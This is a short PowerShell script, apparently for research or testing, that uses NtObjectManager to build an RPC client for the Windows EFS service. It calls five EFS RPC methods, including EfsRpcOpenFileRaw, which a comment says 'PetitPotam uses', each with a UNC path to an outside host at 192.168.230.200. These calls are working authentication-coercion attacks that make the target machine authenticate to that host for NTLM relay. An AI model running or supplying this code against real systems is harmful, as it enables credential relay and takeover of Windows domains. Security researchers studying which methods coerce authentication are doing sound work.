Install-Module NtObjectManager
Import-Module NtObjectManager

$Servers =  Get-RpcServer -Path C:\Windows\system32\efssvc.dll `
            -DbgHelpPath 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\dbghelp.dll'
$EfsInterace = $Servers | Where-Object { $_.InterfaceId -eq 'df1941c5-fe89-4e79-bf10-463657acf44d' }
$client = Get-RpcClient -Server $EfsInterace

$client.Connect()

$ret = $client.EfsRpcOpenFileRaw(        "\\192.168.230.200@1000/asdf\asdf\asdf",1)  # <-- What PetitPotam uses
$ret = $client.EfsRpcEncryptFileSrv(     "\\192.168.230.200@1001/asdf\asdf\asdf")
$ret = $client.EfsRpcDecryptFileSrv(     "\\192.168.230.200@1002/asdf\asdf\asdf",0)
$ret = $client.EfsRpcQueryUsersOnFile(   "\\192.168.230.200@1003/asdf\asdf\asdf")
$ret = $client.EfsRpcQueryRecoveryAgents("\\192.168.230.200@1004/asdf\asdf\asdf")

$client.Disconnect()